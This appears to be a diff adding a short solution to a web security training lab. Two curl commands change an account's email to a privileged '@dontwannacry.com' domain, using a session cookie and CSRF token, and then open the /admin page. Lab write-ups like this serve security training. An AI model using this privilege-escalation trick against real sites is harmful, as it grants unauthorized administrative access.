@@ -1,0 +1,11 @@
+
+First make an account, after confirm your mail, change it to @dontwannacry.com
+
+curl -ik -X $'POST' \
+    -b $'session=3VItVwSZkvoESUuu2ZPSsz1e3plWz8UK' \
+    --data-binary $'email=amin%40dontwannacry.com&csrf=tWFPpMNYzJmrl1WRmc635KhHNVHda1Cm' \
+    $'https://0ac10074039460968073e9ad00220039.web-security-academy.net/my-account/change-email'
+
+curl -ik \
+    -b $'session=3VItVwSZkvoESUuu2ZPSsz1e3plWz8UK' \
+    $'https://0ac10074039460968073e9ad00220039.web-security-academy.net/admin'
